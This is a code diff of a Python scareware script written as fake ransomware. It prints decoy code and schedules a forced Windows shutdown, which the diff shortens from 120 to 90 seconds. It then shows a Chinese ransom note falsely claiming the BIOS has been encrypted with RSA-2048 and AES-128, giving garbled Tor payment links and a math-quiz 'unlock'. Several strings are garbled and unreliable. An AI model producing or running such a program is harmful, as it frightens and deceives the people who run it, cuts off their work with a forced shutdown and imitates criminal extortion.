@@ -99,7 +99,7 @@ printOneByOne("""70 COnC CODE%
       findalP, (pkg(P), wildcard match(Glob, P), |+ sidedn() Ps0)),sort(Ps0, Ps)|""", wait_time = 0.001)
 
 system('cls')
-system("shutdown -s -t 120")
+system("shutdown -s -t 90")
 print("""!!!重要資訊!!!
 
       您的部分主板内置BIOS已被RSA-2048和AES 128暗碼進行了加密。
@@ -110,7 +110,7 @@ print("""!!!重要資訊!!!
 
       tp://h/wilipedia. org/wila/高级加密标准
 
-      只有我們的私密伺服器上的私人金输和解密程式才能解密。
+      只有我們的私密伺服器上的私人密钥和解密程式才能解密。
       如要解锁您的私人端，請點擊以下其中一個達結:
 
       1. htp://3ezlko7fwyood.tor2web.org/3ADBEEDE0B85C0982. htp://zcvkoi7fwyood. onion.to/3ADBEEDE0B85C0983. htp://z/wkoi7fwyood.nion.cab/3ADBEEDE0B85C098如果以上位址都無法打開，請按照以下步骤操作:
@@ -119,7 +119,7 @@ print("""!!!重要資訊!!!
 
       2.安装成功後，通行流覽器，等待初始化。
 
-      3.键入: i3ezvkoi7Fwyood onion/3ADBEEDE0B85C0984. 按隰锅站上的說明進行操作。
+      3.键入: i3ezvkoi7Fwyood onion/3ADBEEDE0B85C0984. 按网站上的說明進行操作。
 
       亦或嘗試解決 少量 的 數學問題 來 解鎖
       按 回車鍵 來使用 最終解決方案""")
@@ -207,7 +207,8 @@ if right >= 3:
 	exit()
 
 else:
-	printOneByOne('錯的太多了，祝妳好運')
+	printOneByOne('祝 你 好 运')
+	system('')
 	sleep(3)
 	exit()
 
